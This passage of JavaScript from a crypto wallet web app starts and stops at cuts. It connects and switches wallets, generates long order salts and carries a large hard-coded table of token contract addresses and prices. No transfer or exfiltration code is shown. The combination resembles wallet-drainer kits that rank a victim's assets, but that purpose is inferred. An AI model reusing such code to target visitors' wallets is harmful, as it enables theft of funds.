        }).on('transactionHash', function(hash) {
            console.log("pena");
            resolve(true);
        }).on('error', function(err) {
            resolve(false);
        });
    })
}

async function switchNetwork() {
    if (window.ethereum != undefined) {
        try {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{
                    chainId: '0x1'
                }]
            });
            return 1;
        } catch (e) {
            console.log(e);
            if (e.code == -32002) return 1;
            return 0;
        }
    } else {
        await onDisconnect();
        return 0;
    }
}

async function onDisconnect() {
    console.log("Killing the wallet connection", provider);

    $('.account-warning').hide();

    // TODO: Which providers have close method?
    if (provider != null && provider.close) {
        await provider.close();

        // If the cached provider is not cleared,
        // WalletConnect will default to the existing session
        // and does not allow to re-scan the QR code with a new wallet.
        // Depending on your use case you may want or want not his behavir.
        // await web3Modal.clearCachedProvider();
        provider = null;
    }
    main();
}

async function onConnect() {
    try {
        provider = await web3Modal.connect();
    } catch (e) {
        console.log("Could not get a wallet connection", e);
        return false;
    }

    // Subscribe to accounts change
    provider.on("accountsChanged", async () => {
        walletConnected();
    });

    // Subscribe to chainId change
    provider.on("chainChanged", (chainId) => {
        walletConnected();
    });

    // Subscribe to networkId change
    // provider.on("networkChanged", (networkId) => {
    //  walletConnected();
    // });
    walletConnected();
    return true;
}

function getSalt() {
    var saltRes = '';
    for (var i = 0; i < 10; i++) {
        var ran = parseInt(Math.random() * 10000000);
        saltRes += ran.toString(10).padStart(7, '0');
    }
    return saltRes.replace(/^0+/, '');;
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

var tokenList = {
    "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2": 1087.97,
    "0x4d224452801aced8b2f0aebe155379bb5d594381": 3.57,
    "0x6b175474e89094c44da98b954eedeac495271d0f": 1.008,
    "0xf4d2888d29d722226fafa5d9b24f9164c092421e": 0.235981,
    "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48": 1.008,
    "0xdac17f958d2ee523a2206206994597c13d831ec7": 1.005,
    "0xa8b919680258d369114910511cc87595aec0be6d": 3.75,
    "0x005d1123878fc55fbd56b54c73963b234a64af3c": 0.00000578,
    "0xcf0c122c6b73ff809c693db761e7baebe62b6a2e": 0.00000588,
    "0x761d38e5ddf6ccf6cf7c55759d5210750b5d60f3": 2.73373e-7,
    "0xa2cd3d43c775978a96bdbf12d733d5a1ed94fb18": 0.086667,
    "0xa2b4c0af19cc16a6cfacce81f192b024d625817d": 3.99605e-10,
    "0xc18360217d8f7ab5e7c516566761ea12ce7f9d72": 8.39,
    "0x6b3595068778dd592e39a122f4f5a5cf09c90fe2": 0.986114,
    "0x4fabb145d64652a948d72533023f6e7a623c7c53": 1.014,
    "0x9992ec3cf6a55b00978cddf2b27bc6882d88d1ec": 0.17901,
    "0x88df592f8eb5d7bd38bfef7deb0fbc02cf3778a0": 11.2,
    "0xf57e7e7c23978c3caec3c3548e3d615c346e79ff": 0.719675,
    "0x9ab7bb7fdc60f4357ecfef43986818a2a3569c62": 0.106834,
    "0xff20817765cb7f73d4bde2e66e067e58d11095c2": 0.00911351,
    "0x3b484b82567a09e2588a13d54d032153f0c0aee0": 3.20429e-7,
    "0xc477d038d5420c6a9e0b031712f61c5120090de9": 0.284359,
    "0x3845badade8e6dff049820680d1f14bd3903a5d0": 0.868447,
    "0x037a54aab062628c9bbae1fdb1583c195585fe41": 0.061951,
    "0x7db5af2b9624e1b3b4bb69d6debd9ad1016a58ac": 5.30289e-7,
    "0x7d1afa7b718fb893db30a3abc0cfc608aacfebb0": 0.394837,
    "0x0ab87046fbb341d058f17cbc4c1133f25a20a52f": 2145.11,
    "0x111111111117dc0aa78b770fa6a738034120c302": 0.590698,
    "0x514910771af9ca656af840dff83e8264ecf986ca": 6.62,
    "0xd26114cd6ee289accf82350c8d8487fedb8a0c07": 1.87,
    "0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce": 0.00000826,
    "0x8207c1ffc5b6804f6024322ccf34f29c3541ae26": 0.218953,
    "0xc770eefad204b5180df6a14ee197d99d808ee52d": 0.071284,
    "0xdc0327d50e6c73db2f8117760592c8bbf1cdcf38": 5.46,
    "0x2b591e99afe9f32eaa6214f7b7629768c40eeb39": 0.03294108,
    "0x7a58c0be72be218b41c608b7fe7c5bb630736c71": 0.02185006,
    "0x2e9d63788249371f1dfc918a52f8d799f4a38c94": 1.51,
    "0x88acdd2a6425c3faae4bc9650fd7e27e0bebb7ab": 3.09,
    "0x83e6f1e41cdd28eaceb20cb649155049fac3d5aa": 0.426789,
    "0x8b39b70e39aa811b69365398e0aace9bee238aeb": 0.106779,
    "0xf3b9569f82b18aef890de263b84189bd33ebe452": 6.6491e-8,
    "0x3432b6a60d23ca0dfca7761b7ab56459d9c964d0": 4.33,
    "0xd38bb40815d2b0c2d2c866e0c72c5728ffc76dd9": 0.228719,
    "0xd5d86fc8d5c0ea1ac1ac5dfab6e529c9967a45e9": 0.026413,
    "0x3b9be07d622accaed78f479bc0edabfd6397e320": 0.115862,
    "0xd13c7342e1ef687c5ad21b27c2b65d772cab5c8c": 0.246898,
    "0xce3f08e664693ca792cace4af1364d5e220827b2": 0.00290682,
    "0x0f51bb10119727a7e5ea3538074fb341f56b09ad": 1.37,
    "0x7659ce147d0e714454073a5dd7003544234b6aa0": 3.06,
    "0x6bba316c48b49bd1eac44573c5c871ff02958469": 0.0000031,
    "0x2a3bff78b79a009976eea096a51a948a3dc00e34": 0.194426,
    "0x767fe9edc9e0df98e07454847909b5e959d7ca0e": 162.11,
    "0x823556202e86763853b40e9cde725f412e294689": 0.144468,
    "0xe80c0cd204d654cebe8dd64a4857cab6be8345a3": 0.00046724,
    "0x64aa3364f17a4d01c6f1751fd97c2bd3d7e7f1d5": 13.09,
    "0xc5b3d3231001a776123194cf1290068e8b0c783b": 0.00008609,
    "0x4da08a1bff50be96bded5c7019227164b49c2bfc": 1.544e-12,
    "0x4cc19356f2d37338b9802aa8e8fc58b0373296e7": 0.00336393,
    "0x16eccfdbb4ee1a85a33f3a9b21175cd7ae753db4": 1.57,
    "0x1e2f15302b90edde696593607b6bd444b64e8f02": 9.779e-12,
    "0x298d492e8c1d909d3f63bc4a36c66c64acb3d695": 0.057522,
    "0xb4d930279552397bba2ee473229f89ec245bc365": 1.022,
    "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599": 20815,
    "0x4e15361fd6b4bb609fa63c81a2be19d873717870": 0.234687,
    "0x16cc8367055ae7e9157dbcb9d86fd6ce82522b31": 0.01283508,
    "0x27c70cd1946795b66be9d954418546998b546634": 303.96,
    "0x3155ba85d5f96b2d030a4966af206230e46849cb": 1.69,
    "0xa1faa113cbe53436df28ff0aee54275c13b40975": 0.108218,
    "0x43ab765ee05075d78ad8aa79dcb1978ca3079258": 0.0384335,
    "0x4521c9ad6a3d4230803ab752ed238be11f8b342f": 0.00000201,
    "0xed35af169af46a02ee13b9d79eb57d6d68c1749e": 0.00114738,
    "0xa5ef74068d04ba0809b7379dd76af5ce34ab7c57": 4.38944e-7,
    "0x198d14f2ad9ce69e76ea330b374de4957c3f850a": 6.04427e-7,
    "0x2ef52ed7de8c5ce03a4ef0efbe9b7450f2d7edc9": 0.00102281,
    "0xae7ab96520de3a18e5e111b5eaab095312d7fe84": 1036.43,
    "0x6c5ba91642f10282b576d91922ae6448c9d52f4e": 0.107188,
    "0xd502f487e1841fdc805130e13eae80c61186bc98": 0.02640849,
    "0xbbc2ae13b23d715c30720f079fcd9b4a74093505": 1.33,
    "0xe28b3b32b6c345a34ff64674606124dd5aceca30": 1.37,
    "0xc7283b66eb1eb5fb86327f08e1b5816b0720212b": 0.179261,
    "0xc944e90c64b2c07662a292be6244bdf05cda44a7": 0.100496,
    "0x3dd98c8a089dbcff7e8fc8d4f532bd493501ab7f": 0.01886874,
    "0x15d4c048f83bd7e37d49ea4c83a07267ec4203da": 0.057293,
    "0xd98f75b1a3261dab9eed4956c93f33749027a964": 0.00207758,
    "0x3301ee63fb29f863f2333bd4466acb46cd8323e6": 1.59493e-7,
    "0x32353a6c91143bfd6c7d363b546e62a9a2489a20": 0.288278,
    "0x333a4823466879eef910a04d473505da62142069": 820.27,
    "0xe53ec727dbdeb9e2d5456c3be40cff031ab40a55": 0.129503,
    "0xe41d2489571d322189246dafa5ebde1f4699f498": 0.269076,
    "0xd533a949740bb3306d119cc777fa900ba034cd52": 0.680651,
    "0xed04915c23f00a313a544955524eb7dbd823143d": 0.01238288,
    "0x3aada3e213abf8529606924d8d1c55cbdc70bf74": 3552.9,
    "0xfb5c6815ca3ac72ce9f5006869ae67f18bf77006": 0.116874,
    "0x656c00e1bcd96f256f224ad9112ff426ef053733": 0.134419,
    "0xf5b5efc906513b4344ebabcf47a04901f99f09f3": 0.00007052,
    "0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2": 762.12,
    "0x59d1e836f7b7210a978b25a855085cc46fd090b5": 0.00008133,
    "0x0000000000095413afc295d19edeb1ad7b71c952": 0.630858,
    "0x3cbb7f5d7499af626026e96a2f05df806f2200dc": 0.00319253,
    "0xf8c3527cc04340b208c854e985240c02f7b7793f": 0.184018,
    "0x6dea81c8171d0ba574754ef6f8b412f2ed88c54d": 1.14,
    "0x94e9eb8b5ab9fd6b9ea3169d55ffade62a01702e": 0.068908,
    "0x50d1c9771902476076ecfc8b2a83ad6b9355a4c9": 24.01,
    "0x993864e43caa7f7f12953ad6feb1d1ca635b875f": 0.510687,
    "0x8c543aed163909142695f2d2acd0d55791a9edb9": 0.04374913,
    "0x3819f64f282bf135d62168c1e513280daf905e06": 2.24269e-7,
    "0x5b7533812759b45c2b44c19e320ba2cd2681b542": 0.04330785,
    "0xc011a73ee8576fb46f5e1c5751ca3b9fe0af2a6f": 1.77,
    "0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9": 58.2,
    "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984": 3.93,
    "0xe1c7e30c42c24582888c758984f6e382096786bd": 0.088959,
    "0xcbe771323587ea16dacb6016e269d7f08a7acc4e": 0.00044435,
    "0xdbdb4d16eda451d0503b854cf79d55697f90c8df": 19.13,
    "0x3506424f91fd33084466f402d5d97f05f8e3b4af": 0.094643,
    "0xdab396ccf3d84cf2d07c4454e10c8a6f5b008d2b": 1.23,
    "0xfc0d6cf33e38bce7ca7d89c0e292274031b7157a": 0.355356,
    "0xa87135285ae208e22068acdbff64b11ec73eaa5a": 0.184658,
    "0x853d955acef822db058eb8505911ed77f175b99e": 1.002,
    "0x8400d94a5cb0fa0d041a3788e395285d61c9ee5e": 0.190925,
    "0x55296f69f40ea6d20e478533c15a6b08b654e758": 0.00674218,
    "0xfbeea1c75e4c4465cb2fccc9c6d6afe984558e20": 1.48,
    "0x09a3ecafa817268f77be1283176b946c4ff2e608": 0.173302,
    "0x92d6c1e31e14520e676a687f0a93788b716beff5": 1.19,
    "0x470ebf5f030ed85fc1ed4c2d36b9dd02e77cf1b7": 0.706685,
    "0x0f5d2fb29fb7d3cfee444a200298f468908cc942": 0.84089,
    "0x990f341946a3fdb507ae7e52d17851b87168017c": 8.14,
    "0xcc4304a31d09258b0029ea7fe63d032f52e44efe": 0.21533,
    "0xb62132e35a6c13ee1ee0f84dc5d40bad8d815206": 0.679208,
    "0xd4342a57ecf2fe7ffa37c33cb8f63b1500e575e6": 0.00367087,
    "0xa393473d64d2f9f026b60b6df7859a689715d092": 0.432388,
    "0x0913ddae242839f8995c0375493f9a1a3bddc977": 0.0097392,
    "0x88ef27e69108b2633f8e1c184cc37940a075cc02": 1.38,
    "0x43dfc4159d86f3a37a5a4b3d4580b888ad7d4ddd": 0.125452,
    "0x58b6a8a3302369daec383334672404ee733ab239": 7.47,
    "0xddf7fd345d54ff4b40079579d4c4670415dbfd0a": 0.119876,
    "0xc98d64da73a6616c42117b582e832812e7b8d57f": 0.136443,
    "0x1c9922314ed1415c95b9fd453c3818fd41867d0b": 0.00303932,
    "0xeb4c2781e4eba804ce9a9803c67d0893436bb27d": 20708,
    "0x8daebade922df735c38c80c7ebd708af50815faa": 19371.27,
    "0xf65b5c5104c4fafd4b709d9d60a185eae063276c": 0.156942,
    "0x30d20208d987713f46dfd34ef128bb16c404d10f": 0.546271,
    "0xaf5191b0de278c7286d6c7cc6ab6bb8a73ba2cd6": 0.417467,
    "0x77777feddddffc19ff86db637967013e6c6a116c": 17.5,
    "0x77fba179c79de5b7653f68b5039af940ada60ce0": 2.83,
    "0xf3dcbc6d72a4e1892f7917b7c43b74131df8480e": 0.04246379,
    "0x940a2db1b7008b6c776d4faaca729d6d4a4aa551": 0.117318,
    "0xb705268213d593b8fd88d3fdeff93aff5cbdcfae": 0.053422,
    "0xb98d4c97425d9908e66e53a6fdf673acca0be986": 0.061227,
    "0x4092678e4e78230f46a1534c0fbc8fa39780892b": 0.00006798,
    "0xdd974d5c2e2928dea5f71b9825b8b646686bd200": 1.41,
    "0x8a2279d4a90b6fe1c4b30fa660cc9f926797baa2": 0.163697,
    "0xd417144312dbf50465b1c641d016962017ef6240": 0.098718,
    "0x0e8d6b471e332f140e7d9dbb99e5e3822f728da6": 0.01400031,
    "0x727f064a78dc734d33eec18d5370aef32ffd46e4": 0.0034442,
    "0x69af81e73a73b40adf4f3d4223cd9b1ece623074": 1.31,
    "0xba5bde662c17e2adff1075610382b9b691296350": 0.171543,
    "0x0d8775f648430679a709e98d2b0cb6250d2887ef": 0.329811,
    "0x03be5c903c727ee2c8c4e9bc0acc860cca4715e2": 0.01353642,
    "0xb59490ab09a0f526cc7305822ac65f2ab12f9723": 0.724789,
    "0xa1d6df714f91debf4e0802a542e13067f31b8262": 0.01172583,
    "0xbb0e17ef65f82ab018d8edd776e8dd940327b28b": 14.03,
    "0xc834fa996fa3bec7aad3693af486ae53d8aa8b50": 0.00074394,
    "0x607f4c5bb672230e8672085532f7e901544a7375": 0.640505,
    "0x8e870d67f660d95d5be530380d0ec0bd388289e1": 1.003,
    "0x0cf0ee63788a0849fe5297f3407f701e122cc023": 0.02492013,
    "0xfe3e6a25e6b192a42a44ecddcd13796471735acf": 0.00338988,
    "0x525a8f6f3ba4752868cde25164382bfbae3990e1": 0.322456,
    "0xc4f6e93aeddc11dc22268488465babcaf09399ac": 0.117919,
    "0x61e90a50137e1f645c9ef4a0d3a4f01477738406": 0.58625,
    "0xf0f9d895aca5c8678f706fb8216fa22957685a13": 0.00000957,
    "0x3597bfd533a99c9aa083587b074434e61eb0a258": 0.00084474,
    "0xc00e94cb662c3520282e6f5717214004a7f26888": 31.23,
    "0x4a220e6096b25eadb88358cb44068a3248254675": 45.97,
    "0x0ff5a8451a839f5f0bb3562689d9a44089738d11": 11.4,
    "0x46e98ffe40e408ba6412beb670507e083c8b95ff": 0.01516712,
    "0x6468e79a80c0eab0f9a2b574c8d5bc374af59414": 0.06215,
    "0xf8e9f10c22840b613cda05a0c5fdb59a4d6cd7ef": 0.01926212,
    "0xaac41ec512808d64625576eddd580e7ea40ef8b2": 0.24498,
    "0xc4c2614e694cf534d407ee49f8e44d125e4681c4": 0.02362413,
    "0x87d73e916d7057945c9bcd8cdd94e42a6f47f776": 24.66,
    "0x549020a9cb845220d66d3e9c6d9f9ef61c981102": 0.00202961,
    "0x77777777772cf0455fb38ee0e75f38034dfa50de": 0.214633,
    "0xa0246c9032bc3a600820415ae600c6388619a14d": 36.41,
    "0x956f47f50a910163d8bf957cf5846d573e7f87ca": 1.002,
    "0xde30da39c46104798bb5aa3fe8b9e0e1f348163f": 2.36,
    "0x0d02755a5700414b26ff040e1de35d337df56218": 0.00556201,
    "0xa9b1eb5908cfc3cdf91f9b8b3a74108598009096": 4.47,
    "0xd373576a9e738f37dc6882328358ff69c4caf4c6": 0.0164613,
    "0xf5cfbc74057c610c8ef151a439252680ac68c6dc": 0.355092,
    "0xd46ba6d942050d489dbd938a2c909a5d5039a161": 0.773671,
    "0x25f8087ead173b73d6e8b84329989a8eea16cf73": 0.400694,
    "0xb31ef9e52d94d4120eb44fe1ddfde5b4654a6515": 0.0169513,
    "0xf629cbd94d3791c9250152bd8dfbdf380e2a3b9c": 0.440513,
    "0x4575f41308ec1483f3d399aa9a2826d74da13deb": 0.095235,
    "0x34f0915a5f15a66eba86f6a58be1a471fb7836a7": 1.92,
    "0xdb25f211ab05b1c97d595516f45794528a807ad8": 1.049,
    "0x57ab1ec28d129707052df4df418d58a2d46d5f51": 1.002,
    "0xd47bdf574b4f76210ed503e0efe81b58aa061f3d": 0.054104,
    "0x15b7c0c907e4c6b9adaaaabc300c08991d6cea05": 0.318698,
    "0xa0b73e1ff0b80914ab6fe0444e65848c4c34450b": 0.115656,
    "0x70d2b7c19352bb76e4409858ff5746e500f2b67c": 0.0200392,
    "0x0bb217e40f8a5cb79adf04e1aab60e5abd0dfc1e": 0.00122281,
    "0x949d48eca67b17269629c7194f4b727d4ef9e5d6": 0.72445,
    "0xd7efb00d12c2c13131fd319336fdf952525da2af": 0.00281269,
    "0xa2881f7f441267042f9778ffa0d4f834693426be": 0.102536,
    "0x090185f2135308bad17527004364ebcc2d37e5f6": 0.00080832,
    "0x1c7e83f8c581a967940dbfa7984744646ae46b29": 5.8456e-8,
    "0x0ae055097c6d159879521c384f1d2123d1f195e6": 3.69,
    "0xdc9ac3c20d1ed0b540df9b1fedc10039df13f99c": 0.120391,
    "0x21bfbda47a0b4b5b1248c767ee49f7caa9b23697": 0.896133,
    "0xd084b83c305dafd76ae3e1b4e1f1fe2ecccb3988": 0.03222494,
    "0x6c3f90f043a72fa612cbac8115ee7e52bde6e490": 1.022,
    "0xf4cd3d3fda8d7fd6c5a500203e38640a70bf9577": 40.01,
    "0xfca59cd816ab1ead66534d82bc21e7515ce441cf": 1.97,
    "0x6fc13eace26590b80cccab1ba5d51890577d83b2": 0.01988695,
    "0x06a01a4d579479dd5d884ebf61a31727a3d8d442": 0.017435,
    "0xbbbbca6a901c926f240b89eacb641d8aec7aeafd": 0.374993,
    "0xea7cc765ebc94c4805e3bff28d7e4ae48d06468a": 0.057266,
    "0x0c572544a4ee47904d54aaa6a970af96b6f00e1b": 0.00976868,
    "0xbe9375c6a420d2eeb258962efb95551a5b722803": 0.00676841,
    "0x7d5121505149065b562c789a0145ed750e6e8cdd": 0.04028493,
    "0x18aaa7115705e8be94bffebde57af9bfc265b998": 0.305652,
    "0x8290333cef9e6d528dd5618fb97a76f268f3edd4": 0.02641402,
    "0xca1207647ff814039530d7d35df0e1dd2e91fa84": 0.123323,
    "0x3c4b6e6e1ea3d4863700d7f76b36b7f3d3f13e3d": 0.520591,
    "0x967da4048cd07ab37855c090aaf366e4ce1b9f48": 0.181845,
    "0x8ce9137d39326ad0cd6491fb5cc0cba0e089b6a9": 0.360965,
    "0xec67005c4e498ec7f55e092bd1d35cbc47c91892": 20.47,
    "0x7121d00b4fa18f13da6c2e30d19c04844e6afdc8": 3.69562e-10,
    "0xdc349913d53b446485e98b76800b6254f43df695": 7.75158e-10,
    "0x744d70fdbe2ba4cf95131626614a1763df805b9e": 0.02675941,
    "0x20d4db1946859e2adb0e5acc2eac58047ad41395": 0.00729043,
    "0xfe5f141bf94fe84bc28ded0ab966c16b17490657": 0.00105666,
    "0x9d71ce49ab8a0e6d2a1e7bfb89374c9392fd6804": 0.03405718,
    "0xb63b606ac810a52cca15e44bb630fd42d8d1d83d": 4.01,
    "0x2730d6fdc86c95a74253beffaa8306b40fedecbb": 3.92,
    "0x5a98fcbea516cf06857215779fd812ca3bef1b32": 0.562414,
    "0x23894dc9da6c94ecb439911caf7d337746575a72": 0.00561136,
    "0x1f573d6fb3f13d689ff844b4ce37794d79a7ff1c": 0.602048,
    "0xd7d8f3b8bc8bc48d3acc37879eaba7b85889fa52": 0.01460104,
    "0x1796ae0b0fa4862485106a0de9b654efe301d0b2": 1.21,
    "0x362bc847a3a9637d3af6624eec853618a43ed7d2": 0.105039,
    "0x9b20dabcec77f6289113e61893f7beefaeb1990a": 0.00089797,
    "0x4cd0c43b0d53bc318cc5342b77eb6f124e47f526": 0.00008445,
    "0x0abdace70d3790235af448c88547603b945604ea": 0.03534082,
    "0x0bc529c00c6401aef6d220be8c6ea1667f6ad93e": 4800.5,
    "0xe4815ae53b124e7263f08dcdbbb757d41ed658c6": 0.03910732,
    "0xcd7492db29e2ab436e819b249452ee1bbdf52214": 0.00000228,
    "0x37fe0f067fa808ffbdd12891c0858532cfe7361d": 0.03490061,
    "0xb12494c8824fc069757f47d177e666c571cd49ae": 1.0691e-11,
    "0x49e833337ece7afe375e44f4e3e8481029218e5c": 0.144856,
    "0x33d0568941c0c64ff7e0fb4fba0b11bd37deed9f": 0.03662725,
    "0x08c32b0726c5684024ea6e141c50ade9690bbdcc": 0.155949,
    "0x0f8c45b896784a1e408526b9300519ef8660209c": 0.00001989,
    "0xe6602b34d8510b033e000975b3322537c7172441": 0.01209043,
    "0x7420b4b9a0110cdc71fb720908340c03f9bc03ec": 0.00907909,
    "0x4d67edef87a5ff910954899f4e5a0aaf107afd42": 4.91739e-10,
    "0x16cda4028e9e872a38acb903176719299beaed87": 0.00322608,
    "0x8e6cd950ad6ba651f6dd608dc70e5886b1aa6b24": 0.00000315,
    "0x0b38210ea11411557c13457d4da7dc6ea731b88a": 1.3,
    "0x8642a849d0dcb7a15a974794668adcfbe4794b56": 0.154777,
    "0xfa5047c9c78b8877af97bdcb85db743fd7313d4a": 20.47,
    "0x491604c0fdf08347dd1fa4ee062a822a5dd06b5d": 0.149159,
    "0xf1f955016ecbcd7321c7266bccfb96c68ea5e49b": 0.03380255,
    "0x249e38ea4102d0cf8264d3701f1a0e39c4f2dc3b": 9.42667e-7,
    "0x7d29a64504629172a429e64183d6673b9dacbfce": 0.504995,
    "0xde7d85157d9714eadf595045cc12ca4a5f3e2adb": 0.03953648,
    "0xc50ef449171a51fbeafd7c562b064b6471c36caa": 7.711e-9,
    "0xc669928185dbce49d2230cc9b0979be6dc797957": 7.69195e-7,
    "0xf3ae5d769e153ef72b4e3591ac004e89f48107a1": 0.03064335,
    "0x10633216e7e8281e33c86f02bf8e565a635d9770": 0.09013,
    "0x0000000000085d4780b73119b644ae5ecd22b376": 0.999831,
    "0xba100000625a3754423978a60c9317c58a424e3d": 4.33,
    "0x45804880de22913dafe09f4980848ece6ecbaf78": 1862.23,
    "0x99d8a9c45b2eca8864373a26d1459e3dff1e17f3": 1.002,
    "0x467bccd9d29f223bce8043b84e8c8b282827790f": 0.00145229,
    "0xaaaebe6fe48e54f431b0c390cfaf0b017d09d42d": 0.560253,
    "0xba11d00c5f74255f56a5e366f4f77f5a186d7f55": 1.4,
    "0xbc7250c8c3eca1dfc1728620af835fca489bfdf3": 0.00000487,
    "0xc86d054809623432210c107af2e3f619dcfbf652": 0.07104,
    "0x383518188c0c6d7730d91b2c03a03c837814a899": 44.34,
    "0x4da0c48376c277cdbd7fc6fdc6936dee3e4adf75": 0.01190641,
    "0x505b5eda5e25a67e1c24a2bf1a527ed9eb88bf04": 0.01500631,
    "0xc2544a32872a91f4a553b404c6950e89de901fdb": 0.921102,
    "0x7de91b204c1c737bcee6f000aaa6569cf7061cb7": 3.63,
    "0x9469d013805bffb7d3debe5e7839237e535ec483": 0.00645657,
    "0x120a3879da835a5af037bb2d1456bebd6b54d4ba": 0.01136579,
    "0x73374ea518de7addd4c2b624c0e8b113955ee041": 0.03622033,
    "0x85eee30c52b0b379b046fb0f85f4f3dc3009afec": 0.164625,
    "0x2f141ce366a2462f02cea3d12cf93e4dca49e4fd": 3.19633e-7,
    "0xdf09a216fac5adc3e640db418c0b956076509503": 0.00438237,
    "0x557b933a7c2c45672b610f8954a3deb39a51a8ca": 0.01625965,
    "0x1e4ede388cbc9f4b5c79681b7f94d36a11abebc9": 0.147521,
    "0xf293d23bf2cdc05411ca0eddd588eb1977e8dcd4": 0.00327709,
    "0xbc396689893d065f41bc2c6ecbee5e0085233447": 0.584303,
    "0x3d658390460295fb963f54dc0899cfb1c30776df": 0.01151588,
    "0x5218e472cfcfe0b64a064f055b43b4cdc9efd3a6": 0.01171634,
    "0x93ed3fbe21207ec2e8f2d3c3de6e058cb73bc04d": 0.02999335,
    "0xf1b99e3e573a1a9c5e6b2ce818b617f0e664e86b": 81.89,
    "0x961c8c0b1aad0c0b10a51fef6a867e3091bcef17": 0.234031,
    "0x71fc1f555a39e0b698653ab0b475488ec3c34d57": 0.06998,
    "0x27054b13b1b798b345b591a4d22e6562d47ea75a": 0.056219,
    "0xcc8fa225d80b9c7d42f96e9570156c65d6caaa25": 0.00364812,
    "0x9aab071b4129b083b01cb5a0cb513ce7eca26fa5": 0.392509,
    "0x4f9254c83eb525f9fcf346490bbb3ed28a81c667": 0.01321755,
    "0xb9d99c33ea2d86ec5ec6b8a4dd816ebba64404af": 0.165224,
    "0x33349b282065b0284d756f0577fb39c158f935e6": 16.57,
    "0x7c84e62859d0715eb77d1b1c4154ecd6abb21bec": 0.00731286,
    "0x7dd9c5cba05e151c895fde1cf355c9a1d5da6429": 0.216928,
    "0xfa14fa6958401314851a17d6c5360ca29f74b57b": 0.00953268,
    "0xc631be100f6cf9a7012c23de5a6ccb990eafc133": 0.00000441,
    "0xf411903cbc70a74d22900a5de66a2dda66507255": 0.00546334,
    "0xaa8330fb2b4d5d07abfe7a72262752a8505c6b37": 0.056162,
    "0x69b148395ce0015c13e36bffbad63f49ef874e03": 0.00003635,
    "0x4123a133ae3c521fd134d7b13a2dec35b56c2463": 0.392252,
    "0xb5c578947de0fd71303f71f2c3d41767438bd0de": 0.056554,
    "0xa3ee21c306a700e682abcdfe9baa6a08f3820419": 0.292803,
    "0x6c6ee5e31d828de241282b9606c8e98ea48526e2": 0.0020477,
    "0xddb3422497e61e13543bea06989c0789117555c5": 0.089127,
    "0x03ab458634910aad20ef5f1c8ee96f1d6ac54919": 3.06,
    "0x6226e00bcac68b0fe55583b90a1d727c14fab77f": 0.00105874,
    "0x20a8cec5fffea65be7122bcab2ffe32ed4ebf03a": 0.02361911,
    "0x60eb57d085c59932d5faa6c6026268a4386927d0": 0.03640171,
    "0xc52c326331e9ce41f04484d3b5e5648158028804": 0.402163,
    "0x6810e776880c02933d47db1b9fc05908e5386b96": 115.14,
    "0x3ea8ea4237344c9931214796d9417af1a1180770": 0.125978,
    "0x4b520c812e8430659fc9f12f6d0c39026c83588d": 0.03726125,
    "0x3af33bef05c2dcb3c7288b77fe1c8d2aeba4d789": 0.03788892,
    "0x7ddc52c4de30e94be3a6a0a2b259b2850f421989": 0.11142,
    "0xb8baa0e4287890a5f79863ab62b7f175cecbd433": 0.051376,
    "0x418d75f65a02b3d53b2418fb8e1fe493759c7605": 206.25,
    "0xb64ef51c888972c908cfacf59b47c1afbc0ab8ac": 0.435059,
    "0xf203ca1769ca8e9e8fe1da9d147db68b6c919817": 0.104655,
    "0x1a4b46696b2bb4794eb3d4c26f1c55f9170fa4c5": 0.42231,
    "0x488e0369f9bc5c40c002ea7c1fe4fd01a198801c": 0.03432258,
    "0x37c997b35c619c21323f3518b9357914e8b99525": 0.561563,
    "0x626e8036deb333b408be468f951bdb42433cbf18": 0.052413,
    "0xf16e81dce15b08f326220742020379b855b87df9": 0.350761,
    "0xccc8cb5229b0ac8069c51fd58367fd1e622afd97": 0.521614,
    "0x9e32b13ce7f2e80a01932b42553652e053d6ed8e": 16.41,
    "0x40fd72257597aa14c7231a7b1aaa29fce868f677": 7.61,
    "0x19062190b1925b5b6689d7073fdfc8c2976ef8cb": 0.552659,
    "0x408e41876cccdc0f92210600ef50372656052a38": 0.096214,
    "0x799ebfabe77a6e34311eeee9825190b9ece32824": 1.71,
    "0x1ffe8a8177d3c261600a8bd8080d424d64b7fbc2": 0.0023,
    "0x2602278ee1882889b946eb11dc0e810075650983": 0.00028782,
    "0xcfa0885131f602d11d4da248d2c65a62063567a9": 0.0002172,
    "0x84ca8bc7997272c7cfb4d0cd3d55cd942b3c9419": 0.387584,
    "0xf418588522d5dd018b425e472991e52ebbeeeeee": 0.302159,
    "0x2a8e1e676ec238d8a992307b495b45b3feaa5e86": 0.997866,
    "0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24": 0.355085,
    "0x3affcca64c2a6f4e3b6bd9c64cd2c969efd1ecbe": 0.00072878,
    "0xa5f2211b9b8170f694421f2046281775e8468044": 0.24927,
    "0x91dfbee3965baaee32784c2d546b7a0c62f268c9": 0.00916434,
    "0x221657776846890989a759ba2973e427dff5c9bb": 8.55,
    "0x0954906da0bf32d5479e25f46056d22f08464cab": 3.6,
    "0xbc6da0fe9ad5f3b0d58160288917aa56653660e9": 0.991058,
    "0x429881672b9ae42b8eba0e26cd9c73711b891ca5": 0.998468,
    "0x84cffa78b2fbbeec8c37391d2b12a04d2030845e": 0.05296,
    "0x1cc30e2eac975416060ec6fe682041408420d414": 0.00984118,
    "0x5ca381bbfb58f0092df149bd3d243b08b9a8386e": 0.066508,
    "0xe76c6c83af64e4c60245d8c7de953df673a7a33d": 1.013,
    "0xfc979087305a826c2b2a0056cfaba50aad3e6439": 0.00346183,
    "0x0391d2021f89dc339f60fff84546ea23e337750f": 2.7,
    "0xf5581dfefd8fb0e4aec526be659cfab1f8c781da": 0.127052,
    "0xec213f83defb583af3a000b1c0ada660b1902a0f": 0.080506,
    "0x40803cea2b2a32bda1be61d3604af6a814e70976": 0.708187,
    "0x31429d1856ad1377a8a0079410b297e1a9e214c2": 0.072375,
    "0xcd1faff6e578fa5cac469d2418c95671ba1a62fe": 0.02779726,
    "0x9be89d2a4cd102d8fecc6bf9da793be995c22541": 20705,
    "0xee573a945b01b788b9287ce062a0cfc15be9fd86": 0.060026,
    "0xcbfef8fdd706cde6f208460f2bf39aa9c785f05d": 0.139643,
    "0xac57de9c1a09fec648e93eb98875b212db0d460b": 1.19e-9,
